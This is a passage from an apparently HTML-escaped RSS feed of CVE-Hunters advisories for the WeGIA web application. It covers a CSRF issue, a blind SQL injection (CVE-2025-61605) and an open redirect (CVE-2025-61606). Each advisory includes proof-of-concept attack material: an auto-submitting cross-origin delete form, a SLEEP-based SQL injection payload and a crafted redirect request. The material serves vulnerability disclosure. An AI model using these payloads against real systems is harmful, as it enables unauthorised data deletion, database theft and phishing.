 /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Top-Level Navigation (works even with SameSite=Lax)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Host the file below from a different origin and open it while logged into WeGIA (ex: &lt;code&gt;poc_csrf_get.html&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://sec.wegia.org:8000/WeGIA/controle/control.php&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;_self&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;metodo&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;excluir&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;nomeClasse&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;AlmoxarifadoControle&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;id_almoxarifado&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;{choose a ID}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;steps-to-reproduce&#34;&gt;Steps to Reproduce:
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Sign in to WeGIA with a user allowed to delete &lt;code&gt;Almoxarifado&lt;/code&gt;.&lt;/li&gt;
    &lt;li&gt;From another origin (e.g., &lt;code&gt;http://127.0.0.1:8008&lt;/code&gt;), open the PoC HTML above.&lt;/li&gt;
    &lt;li&gt;Observe WeGIA executing the delete flow (e.g., FK error or normal delete), proving a cross-site request can trigger the action.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;h2 id=&#34;impact&#34;&gt;Impact
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Integrity compromise: Attackers can induce privileged users to perform destructive actions by visiting an attacker-controlled page.&lt;/li&gt;
    &lt;li&gt;Potential data loss or operational disruption if IDs not protected by FK constraints are targeted.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-59hm-4m9h-ch3m&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-59hm-4m9h-ch3m&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;finder&#34;&gt;Finder
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.linkedin.com/in/marceloqueirozjr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;img src=&#34;/assets/contributors/50x50/marcelo50x50.png&#34;



	loading=&#34;lazy&#34;


 /&gt;&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;http://www.linkedin.com/in/marceloqueirozjr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Marcelo Queiroz&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;By: &lt;a class=&#34;link&#34; href=&#34;https://github.com/CVE-Hunters/cve-hunters&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-Hunters&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

item.description:
&lt;h2 id=&#34;cve-2025-61605-sql-injection-blind-time-based-vulnerability-in-descricao-parameter-on-controlecontrolphp-endpoint&#34;&gt;CVE-2025-61605: SQL Injection (Blind Time-Based) Vulnerability in &lt;code&gt;descricao&lt;/code&gt; Parameter on &lt;code&gt;/controle/control.php&lt;/code&gt; Endpoint
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-61605&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2025-61605&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;A SQL Injection vulnerability was discovered in the &lt;code&gt;descricao&lt;/code&gt; parameter of the &lt;code&gt;/controle/control.php&lt;/code&gt; endpoint. This issue allows any attacker to inject arbitrary SQL queries, potentially leading to unauthorized data access or further exploitation depending on database configuration.&lt;/p&gt;
&lt;h2 id=&#34;details&#34;&gt;Details
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;The application fails to properly sanitize user-supplied input in the &lt;code&gt;descricao&lt;/code&gt; parameter. As a result, specially crafted SQL payloads are interpreted directly by the backend database.&lt;/p&gt;

item.content:encoded:
&lt;h2 id=&#34;cve-2025-61605-sql-injection-blind-time-based-vulnerability-in-descricao-parameter-on-controlecontrolphp-endpoint&#34;&gt;CVE-2025-61605: SQL Injection (Blind Time-Based) Vulnerability in &lt;code&gt;descricao&lt;/code&gt; Parameter on &lt;code&gt;/controle/control.php&lt;/code&gt; Endpoint
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-61605&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2025-61605&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;A SQL Injection vulnerability was discovered in the &lt;code&gt;descricao&lt;/code&gt; parameter of the &lt;code&gt;/controle/control.php&lt;/code&gt; endpoint. This issue allows any attacker to inject arbitrary SQL queries, potentially leading to unauthorized data access or further exploitation depending on database configuration.&lt;/p&gt;
&lt;h2 id=&#34;details&#34;&gt;Details
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;The application fails to properly sanitize user-supplied input in the &lt;code&gt;descricao&lt;/code&gt; parameter. As a result, specially crafted SQL payloads are interpreted directly by the backend database.&lt;/p&gt;
&lt;h2 id=&#34;poc&#34;&gt;PoC
&lt;/h2&gt;&lt;p&gt;Vulnerable Endpoint: &lt;code&gt;/controle/control.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Parameter: &lt;code&gt;descricao&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;payload&#34;&gt;Payload:
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39;%20AND%20SLEEP(5)%20AND%20&amp;#39;1&amp;#39;%3D&amp;#39;1&amp;#39;--%20-
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/cve-2025-61605/image.png&#34;
	width=&#34;1530&#34;
	height=&#34;710&#34;
	srcset=&#34;/p/cve-2025-61605/image_hu_14dc839ca21520de.png 480w, /p/cve-2025-61605/image_hu_b816c8af74ba98e7.png 1024w&#34;
	loading=&#34;lazy&#34;


		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;215&#34;
		data-flex-basis=&#34;517px&#34;

 /&gt;&lt;/p&gt;
&lt;p style=&#34;text-align: justify;&#34;&gt;Observe the time delay in the server response, indicating the successful execution of the SQL payload.&lt;/p&gt;
&lt;h2 id=&#34;impact&#34;&gt;Impact
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Unauthorized access to sensitive data (e.g., users, passwords, logs).&lt;/li&gt;
    &lt;li&gt;Database enumeration (schemas, tables, users, versions).&lt;/li&gt;
    &lt;li&gt;Escalation to RCE depending on DB configuration (e.g., xp_cmdshell, UDFs).&lt;/li&gt;
    &lt;li&gt;Full compromise of the application if chained with other vulnerabilities.&lt;/li&gt;
    &lt;li&gt;This issue affects all users and environments, as it does not require authentication and is reachable via a public endpoint.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-v8hm-pq8g-c7j4&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-v8hm-pq8g-c7j4&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;finder&#34;&gt;Finder
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.linkedin.com/in/marceloqueirozjr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;img src=&#34;/assets/contributors/50x50/marcelo50x50.png&#34;



	loading=&#34;lazy&#34;


 /&gt;&lt;/a&gt; &lt;a class=&#34;link&#34; href=&#34;http://www.linkedin.com/in/marceloqueirozjr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Marcelo Queiroz&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;By: &lt;a class=&#34;link&#34; href=&#34;https://github.com/CVE-Hunters/cve-hunters&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CVE-Hunters&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

item.description:
&lt;h2 id=&#34;cve-2025-61606-open-redirect-vulnerability-in-controlphp-endpoint-nextpage-parameter&#34;&gt;CVE-2025-61606: Open Redirect Vulnerability in &lt;code&gt;control.php&lt;/code&gt; endpoint &lt;code&gt;nextPage&lt;/code&gt; parameter
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-61606&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2025-61606&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;An Open Redirect vulnerability was identified in the &lt;code&gt;control.php&lt;/code&gt; endpoint of the WeGIA application, specifically in the &lt;code&gt;nextPage&lt;/code&gt; parameter (metodo=listarUm nomeClasse=FuncionarioControle).&lt;/br&gt;&lt;/br&gt;This vulnerability allows attackers to redirect users to arbitrary external domains, enabling phishing campaigns, malicious payload distribution, or user credential theft.&lt;/p&gt;
&lt;h2 id=&#34;details&#34;&gt;Details
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;The application fails to validate and sanitize user input in the &lt;code&gt;nextPage&lt;/code&gt; parameter.&lt;/br&gt;&lt;/br&gt;As a result, attackers can craft malicious URLs that redirect users to external websites outside the trusted domain, undermining user trust and enabling social engineering attacks.&lt;/p&gt;

item.content:encoded:
&lt;h2 id=&#34;cve-2025-61606-open-redirect-vulnerability-in-controlphp-endpoint-nextpage-parameter&#34;&gt;CVE-2025-61606: Open Redirect Vulnerability in &lt;code&gt;control.php&lt;/code&gt; endpoint &lt;code&gt;nextPage&lt;/code&gt; parameter
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;CVE Publication: &lt;a class=&#34;link&#34; href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-61606&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.cve.org/CVERecord?id=CVE-2025-61606&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;An Open Redirect vulnerability was identified in the &lt;code&gt;control.php&lt;/code&gt; endpoint of the WeGIA application, specifically in the &lt;code&gt;nextPage&lt;/code&gt; parameter (metodo=listarUm nomeClasse=FuncionarioControle).&lt;/br&gt;&lt;/br&gt;This vulnerability allows attackers to redirect users to arbitrary external domains, enabling phishing campaigns, malicious payload distribution, or user credential theft.&lt;/p&gt;
&lt;h2 id=&#34;details&#34;&gt;Details
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;The application fails to validate and sanitize user input in the &lt;code&gt;nextPage&lt;/code&gt; parameter.&lt;/br&gt;&lt;/br&gt;As a result, attackers can craft malicious URLs that redirect users to external websites outside the trusted domain, undermining user trust and enabling social engineering attacks.&lt;/p&gt;
&lt;p&gt;Vulnerable Endpoint: &lt;code&gt;GET metodo=listarUm&amp;amp;nomeClasse=FuncionarioControle&amp;amp;nextPage=https%3A%2F%2Fgoogle.com&amp;amp;id_funcionario=2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Parameter: &lt;code&gt;nextPage&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;poc&#34;&gt;PoC
&lt;/h3&gt;&lt;h4 id=&#34;request&#34;&gt;Request:
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /WeGIA/controle/control.php?metodo=listarUm&amp;amp;nomeClasse=FuncionarioControle&amp;amp;nextPage=https%3A%2F%2Fgoogle.com&amp;amp;id_funcionario=2 HTTP/1.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: sec.wegia.org:8000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Language: en-US,en;q=0.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip, deflate, br, zstd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Referer: https://sec.wegia.org:8000/WeGIA/html/funcionario/informacao_funcionario.php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cookie: {COOKIE}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Upgrade-Insecure-Requests: 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-Dest: document
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-Mode: navigate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-Site: same-origin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Sec-Fetch-User: ?1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Priority: u=0, i
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;The server accepts the crafted request and successfully redirects the victim to &lt;code&gt;https://google.com&lt;/code&gt; instead of restricting navigation to the application’s own domain.&lt;/p&gt;
&lt;h2 id=&#34;impact&#34;&gt;Impact
&lt;/h2&gt;&lt;p style=&#34;text-align: justify;&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;Phishing: Attackers can trick users into visiting malicious sites that mimic legitimate ones.&lt;/li&gt;
    &lt;li&gt;Credential theft: Fake login pages can capture user credentials.&lt;/li&gt;
    &lt;li&gt;Malware distribution: Victims may be redirected to websites hosting malicious software.&lt;/li&gt;
    &lt;li&gt;Reputation damage: Users may lose trust in the Wegia platform if abused in phishing campaigns.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-m64v-hm7q-33wr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-m64v-hm7q-33wr&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
